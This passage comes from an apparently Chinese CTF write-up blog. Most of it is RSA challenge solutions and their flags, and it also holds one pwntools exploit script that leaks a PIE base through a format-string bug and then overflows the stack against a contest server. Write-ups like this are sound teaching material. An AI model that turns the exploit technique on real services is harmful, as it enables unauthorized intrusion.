punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span>                PP <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>P<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>Q<span class="token punctuation">)</span><span class="token punctuation">)</span>                QQ <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>Q<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>P<span class="token punctuation">)</span><span class="token punctuation">)</span>                N <span class="token operator">=</span> PP <span class="token operator">*</span> QQ                <span class="token keyword">if</span> N <span class="token operator">==</span>n<span class="token punctuation">:</span>                    <span class="token keyword">break</span>phi <span class="token operator">=</span> <span class="token punctuation">(</span>PP<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>QQ<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>e<span class="token operator">=</span><span class="token number">65537</span>d <span class="token operator">=</span> inverse<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span>PP<span class="token operator">*</span>QQ<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">flag&#123;HaMbu2g3r_1S_2ea1ll_D3lci0U3_By_R3A!!&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="陕西游玩"><a href="#陕西游玩" class="headerlink" title="陕西游玩"></a>陕西游玩</h2><p>用2的格式化字符串漏洞泄露基地址,绕过pie,用1进行栈溢出,返回shanxi函数的后门</p><pre class="line-numbers language-PYTHON" data-language="PYTHON"><code class="language-PYTHON">from pwn import *context(log_level &#x3D; &#39;debug&#39;)# p &#x3D; process(&#39;pwn1&#39;)p &#x3D; remote(&#39;121.196.192.181&#39;,10001)elf &#x3D; ELF(&#39;pwn1&#39;)key &#x3D; &quot;choice :&quot;p.sendlineafter(key,b&#39;2&#39;)p.sendafter(&quot;rs\n&quot;,b&#39;%11$p&#39;)base &#x3D; int(p.recv(14).decode(),16) - 0x13a0success(&quot;base--&gt;&quot; + hex(base))p.sendlineafter(key,b&#39;1&#39;)payload &#x3D; cyclic(0x28) + p64(base +0x129a)p.send(payload)p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后ls,发现有flag,然后cat flag</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;0758fce358ceab884ced023bf80e6bc4&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> match </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 2023陕西省赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>已知p,q异或和乘积分解n</title>
      <link href="/2023/06/03/%E5%B7%B2%E7%9F%A5p-q%E5%BC%82%E6%88%96%E5%92%8C%E4%B9%98%E7%A7%AF%E5%88%86%E8%A7%A3n/"/>
      <url>/2023/06/03/%E5%B7%B2%E7%9F%A5p-q%E5%BC%82%E6%88%96%E5%92%8C%E4%B9%98%E7%A7%AF%E5%88%86%E8%A7%A3n/</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/sliedes/xor_factor/blob/master/xor_factor.py">https://github.com/sliedes/xor_factor/blob/master/xor_factor.py</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token keyword">import</span> math<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">check_cong</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> p<span class="token punctuation">,</span> q<span class="token punctuation">,</span> n<span class="token punctuation">,</span> xored<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    kmask <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> k<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span>    p <span class="token operator">&amp;</span><span class="token operator">=</span> kmask    q <span class="token operator">&amp;</span><span class="token operator">=</span> kmask    n <span class="token operator">&amp;</span><span class="token operator">=</span> kmask    pqm <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">*</span>q<span class="token punctuation">)</span> <span class="token operator">&amp;</span> kmask    <span class="token keyword">return</span> pqm <span class="token operator">==</span> n <span class="token keyword">and</span> <span class="token punctuation">(</span>xored <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">or</span> <span class="token punctuation">(</span>p<span class="token operator">^</span>q<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token punctuation">(</span>xored <span class="token operator">&amp;</span> kmask<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">extend</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">:</span>    kbit <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span>k<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">assert</span> a <span class="token operator">&lt;</span> kbit    <span class="token keyword">yield</span> a    <span class="token keyword">yield</span> a <span class="token operator">|</span> kbit<span class="token keyword">def</span> <span class="token function">factor</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> p_xor_q<span class="token punctuation">)</span><span class="token punctuation">:</span>    tracked <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> q<span class="token punctuation">)</span> <span class="token keyword">for</span> p <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">for</span> q <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span>                   <span class="token keyword">if</span> check_cong<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> p<span class="token punctuation">,</span> q<span class="token punctuation">,</span> n<span class="token punctuation">,</span> p_xor_q<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    PRIME_BITS <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>math<span class="token punctuation">.</span>ceil<span class="token punctuation">(</span>math<span class="token punctuation">.</span>log<span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    maxtracked <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>tracked<span class="token punctuation">)</span>    <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> PRIME_BITS<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        newset <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> tp<span class="token punctuation">,</span> tq <span class="token keyword">in</span> tracked<span class="token punctuation">:</span>            <span class="token keyword">for</span> newp_ <span class="token keyword">in</span> extend<span class="token punctuation">(</span>k<span class="token punctuation">,</span> tp<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">for</span> newq_ <span class="token keyword">in</span> extend<span class="token punctuation">(</span>k<span class="token punctuation">,</span> tq<span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token comment"># Remove symmetry</span>                    newp<span class="token punctuation">,</span> newq <span class="token operator">=</span> <span class="token builtin">sorted</span><span class="token punctuation">(</span><span class="token punctuation">[</span>newp_<span class="token punctuation">,</span> newq_<span class="token punctuation">]</span><span class="token punctuation">)</span>                    <span class="token keyword">if</span> check_cong<span class="token punctuation">(</span>k<span class="token punctuation">,</span> newp<span class="token punctuation">,</span> newq<span class="token punctuation">,</span> n<span class="token punctuation">,</span> p_xor_q<span class="token punctuation">)</span><span class="token punctuation">:</span>                        newset<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token punctuation">(</span>newp<span class="token punctuation">,</span> newq<span class="token punctuation">)</span><span class="token punctuation">)</span>        tracked <span class="token operator">=</span> newset        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>tracked<span class="token punctuation">)</span> <span class="token operator">></span> maxtracked<span class="token punctuation">:</span>            maxtracked <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>tracked<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Tracked set size: &#123;&#125; (max=&#123;&#125;)'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>tracked<span class="token punctuation">)</span><span class="token punctuation">,</span> maxtracked<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># go through the tracked set and pick the correct (p, q)</span>    <span class="token keyword">for</span> p<span class="token punctuation">,</span> q <span class="token keyword">in</span> tracked<span class="token punctuation">:</span>        <span class="token keyword">if</span> p <span class="token operator">!=</span> <span class="token number">1</span> <span class="token keyword">and</span> p<span class="token operator">*</span>q <span class="token operator">==</span> n<span class="token punctuation">:</span>            <span class="token keyword">return</span> p<span class="token punctuation">,</span> q    <span class="token keyword">assert</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">'factors were not in tracked set. Is your p^q correct?'</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Usage: xor_factor.py n p_xor_q'</span><span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'(give both numbers in decimal)'</span><span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>    n <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    p_xor_q <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    p<span class="token punctuation">,</span> q <span class="token operator">=</span> factor<span class="token punctuation">(</span>n<span class="token punctuation">,</span> p_xor_q<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> crypto </category>
          
          <category> RSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 分解n </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LitCTF2023</title>
      <link href="/2023/05/15/LitCTF2023/"/>
      <url>/2023/05/15/LitCTF2023/</url>
      
        <content type="html"><![CDATA[<p>AK赛</p><p>这里只有密码的wp</p><p>rank:2</p><h1 id="Hex？Hex！"><a href="#Hex？Hex！" class="headerlink" title="Hex？Hex！"></a>Hex？Hex！</h1><p>直接十六进制转字符串</p><p><img src="/2023/05/15/LitCTF2023/image-20230513111930579.png" alt="image-20230513111930579"></p><p>LitCTF{tai111coollaaa!}</p><h1 id="梦想是红色的"><a href="#梦想是红色的" class="headerlink" title="梦想是红色的"></a>梦想是红色的</h1><p>核心价值观编码</p><p><img src="/2023/05/15/LitCTF2023/image-20230513112102874.png" alt="image-20230513112102874"></p><p>LitCTF{为之则易,不为则难}</p><h1 id="factordb"><a href="#factordb" class="headerlink" title="factordb"></a>factordb</h1><p>直接分解n求RSA</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> libnum<span class="token keyword">import</span> gmpy2e <span class="token operator">=</span> <span class="token number">65537</span>n <span class="token operator">=</span> <span class="token number">87924348264132406875276140514499937145050893665602592992418171647042491658461</span>c <span class="token operator">=</span> <span class="token number">87677652386897749300638591365341016390128692783949277305987828177045932576708</span>p<span class="token operator">=</span><span class="token number">319576316814478949870590164193048041239</span>q<span class="token operator">=</span><span class="token number">275127860351348928173285174381581152299</span>phi<span class="token operator">=</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span>m<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># LitCTF&#123;factordb!!!&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="家人们！谁懂啊，RSA签到都不会"><a href="#家人们！谁懂啊，RSA签到都不会" class="headerlink" title="家人们！谁懂啊，RSA签到都不会"></a>家人们！谁懂啊，RSA签到都不会</h1><p>简单RSA</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> libnum<span class="token keyword">import</span> gmpy2e <span class="token operator">=</span> <span class="token number">65537</span>p <span class="token operator">=</span> <span class="token number">12567387145159119014524309071236701639759988903138784984758783651292440613056150667165602473478042486784826835732833001151645545259394365039352263846276073</span>q <span class="token operator">=</span> <span class="token number">12716692565364681652614824033831497167911028027478195947187437474380470205859949692107216740030921664273595734808349540612759651241456765149114895216695451</span>c <span class="token operator">=</span> <span class="token number">108691165922055382844520116328228845767222921196922506468663428855093343772017986225285637996980678749662049989519029385165514816621011058462841314243727826941569954125384522233795629521155389745713798246071907492365062512521474965012924607857440577856404307124237116387085337087671914959900909379028727767057</span>n<span class="token operator">=</span>p<span class="token operator">*</span>qphi<span class="token operator">=</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span>m<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># LitCTF&#123;it_is_easy_to_solve_question_when_you_know_p_and_q&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="yafu"><a href="#yafu" class="headerlink" title="yafu"></a>yafu</h1><p>可以直接用sage  euler_phi(n)来求phi</p><p>sage</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> libnum<span class="token keyword">import</span> gmpy2n <span class="token operator">=</span> <span class="token number">15241208217768849887180010139590210767831431018204645415681695749294131435566140166245881287131522331092026252879324931622292179726764214435307</span>c <span class="token operator">=</span> <span class="token number">12608550100856399369399391849907846147170257754920996952259023159548789970041433744454761458030776176806265496305629236559551086998780836655717</span>e <span class="token operator">=</span> <span class="token number">65537</span>phi<span class="token operator">=</span>euler_phi<span class="token punctuation">(</span>n<span class="token punctuation">)</span>d<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span>m<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># LitCTF&#123;Mu1tiple_3m4ll_prim5_fac7ors_@re_uns4f5&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="P-Leak"><a href="#P-Leak" class="headerlink" title="P_Leak"></a>P_Leak</h1><p>dp泄露直接套脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> libnum<span class="token keyword">import</span> gmpy2e<span class="token operator">=</span><span class="token number">65537</span>dp<span class="token operator">=</span> <span class="token number">5892502924236878675675338970704766304539618343869489297045857272605067962848952532606770917225218534430490745895652561015493032055636004130931491316020329</span>n<span class="token operator">=</span> <span class="token number">50612159190225619689404794427464916374543237300894011803225784470008992781409447214236779975896311093686413491163221778479739252804271270231391599602217675895446538524670610623369953168412236472302812808639218392319634397138871387898452935081756580084070333246950840091192420542761507705395568904875746222477</span>c<span class="token operator">=</span> <span class="token number">39257649468514605476432946851710016346016992413796229928386230062780829495844059368939749930876895443279723032641876662714088329296631207594999580050131450251288839714711436117326769029649419789323982613380617840218087161435260837263996287628129307328857086987521821533565738409794866606381789730458247531619</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">65535</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token operator">=</span><span class="token punctuation">(</span>dp<span class="token operator">*</span>e<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">//</span>i<span class="token operator">+</span><span class="token number">1</span>    <span class="token keyword">if</span> n<span class="token operator">%</span>p<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>        q<span class="token operator">=</span>n<span class="token operator">//</span>p        <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span>phi_n<span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi_n<span class="token punctuation">)</span>m<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>flag<span class="token operator">=</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># LitCTF&#123;Prim3_1s_Le@k!!!!!&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="easy-math"><a href="#easy-math" class="headerlink" title="easy_math"></a>easy_math</h1><p>直接解方程</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">n <span class="token operator">=</span> <span class="token number">2230791374046346835775433548641067593691369485828070649075162141394476183565187654365131822111419512477883295758461313983481545182887415447403634720326639070667688614534290859200753589300443797</span>c <span class="token operator">=</span> <span class="token number">2168563038335029902089976057856861885635845445863841607485310134441400500612435296818745930370268060353437465666224400129105788787423156958336380480503762222278722770240792709450637433509537280</span>hint <span class="token operator">=</span> <span class="token number">392490868359411675557103683163021977774935163924606169241731307258226973701652855448542714274348304997416149742779376023311152228735117186027560227613656229190807480010615064372521942836446425717660375242197759811804760170129768647414717571386950790115746414735411766002368288743086845078803312201707960465419405926186622999423245762570917629351110970429987377475979058821154568001902541710817731089463915930932142007312230897818177067675996751110894377356758932</span><span class="token keyword">import</span> libnum<span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> sympyp<span class="token operator">=</span>sympy<span class="token punctuation">.</span>Symbol<span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">)</span>q<span class="token operator">=</span>sympy<span class="token punctuation">.</span>Symbol<span class="token punctuation">(</span><span class="token string">'q'</span><span class="token punctuation">)</span>f1<span class="token operator">=</span>p<span class="token operator">*</span>q<span class="token operator">-</span>nf2<span class="token operator">=</span>p<span class="token operator">**</span><span class="token number">3</span><span class="token operator">-</span>q<span class="token operator">**</span><span class="token number">5</span> <span class="token operator">-</span>hintresult<span class="token operator">=</span>sympy<span class="token punctuation">.</span>solve<span class="token punctuation">(</span><span class="token punctuation">[</span>f1<span class="token punctuation">,</span>f2<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>p<span class="token punctuation">,</span>q<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>e<span class="token operator">=</span><span class="token number">65537</span>p<span class="token operator">=</span><span class="token number">7321664971326604351487965655099805117568571010588695608389113791312918573783115429227542573780838065461696504325762281209452761930184231131129306271846427</span>q<span class="token operator">=</span><span class="token number">304683618109085947723284393392507415311</span>phi<span class="token operator">=</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span>m<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#LitCTF&#123;f9fab7522253e44b48824e914d0801ba&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="e的学问"><a href="#e的学问" class="headerlink" title="e的学问"></a>e的学问</h1><p>e和phi不互素直接套脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">e<span class="token operator">=</span><span class="token number">74</span>p<span class="token operator">=</span> <span class="token number">86053582917386343422567174764040471033234388106968488834872953625339458483149</span>q<span class="token operator">=</span> <span class="token number">72031998384560188060716696553519973198388628004850270102102972862328770104493</span>c<span class="token operator">=</span> <span class="token number">3939634105073614197573473825268995321781553470182462454724181094897309933627076266632153551522332244941496491385911139566998817961371516587764621395810123</span><span class="token keyword">import</span> gmpy2<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># 当e约去公约数后与phi互素</span><span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> q<span class="token punctuation">,</span> e<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">:</span>    n <span class="token operator">=</span> p <span class="token operator">*</span> q    phi <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>    t <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>    d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e <span class="token operator">//</span> t<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>    m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>    msg <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>m<span class="token punctuation">,</span> t<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span>    <span class="token keyword">if</span> msg<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>msg<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>decrypt<span class="token punctuation">(</span>p<span class="token punctuation">,</span> q<span class="token punctuation">,</span> e<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token comment">#LitCTF&#123;e_1s_n0t_@_Prime&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="原来你也玩原神"><a href="#原来你也玩原神" class="headerlink" title="原来你也玩原神"></a>原来你也玩原神</h1><p><img src="/2023/05/15/LitCTF2023/image-20230513131736538.png" alt="image-20230513131736538"></p><p><img src="/2023/05/15/LitCTF2023/image-20230513132513174.png" alt="image-20230513132513174"></p><p>对照即可</p><p>{yuanlainiyewanyuanshenwww}</p><p>转化为大写</p><p>NSSCTF{YUANLAINIYEWANYUANSHENWWW}</p><h1 id="你是我的关键词-Keyworld"><a href="#你是我的关键词-Keyworld" class="headerlink" title="你是我的关键词(Keyworld)"></a>你是我的关键词(Keyworld)</h1><p>根据题目名称直接手撸</p><pre class="line-numbers language-none"><code class="language-none">IFRURC&#123;X0S_YP3_JX_HBXV0PA&#125;LITCTF&#123;Y0U_AR3_MY_KEYW0RD&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="Is-this-only-base"><a href="#Is-this-only-base" class="headerlink" title="Is this only base?"></a>Is this only 